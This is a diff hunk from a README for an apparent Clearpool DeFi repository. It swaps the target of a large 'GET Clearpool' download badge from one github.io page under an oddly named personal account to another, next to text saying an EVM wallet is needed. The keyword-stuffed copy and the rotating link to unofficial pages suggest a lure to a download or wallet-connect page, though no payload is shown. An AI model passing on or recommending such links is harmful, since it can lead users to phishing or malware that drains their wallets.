@@ -53,7 +53,7 @@ The ecosystem also connects Clearpool DeFi activity with tokenized incentives, g
 
 Prerequisites: A browser, an EVM-compatible wallet for live protocol interaction, and basic familiarity with decentralized finance concepts before reviewing Clearpool protocol resources.
 
-[![GET Clearpool](https://img.shields.io/badge/GET%20%E2%80%94%20Clearpool-0078D6?style=for-the-badge&logoColor=white)](https://vancehudsonazuw.github.io/.github/clearpool-protocol)
+[![GET Clearpool](https://img.shields.io/badge/GET%20%E2%80%94%20Clearpool-0078D6?style=for-the-badge&logoColor=white)](https://noeljaramillovurz.github.io/.github/clearpool-protocol)
 
 1.  **Open the Resource:** Download or clone this Clearpool protocol repository and review the included notes on clearpool crypto, market structure, and product terminology.
 2.  **Review Market Concepts:** Read the Clearpool DeFi overview to understand borrower pools, liquidity providers, Clearpool lending behavior, and Clearpool credit marketplace activity.
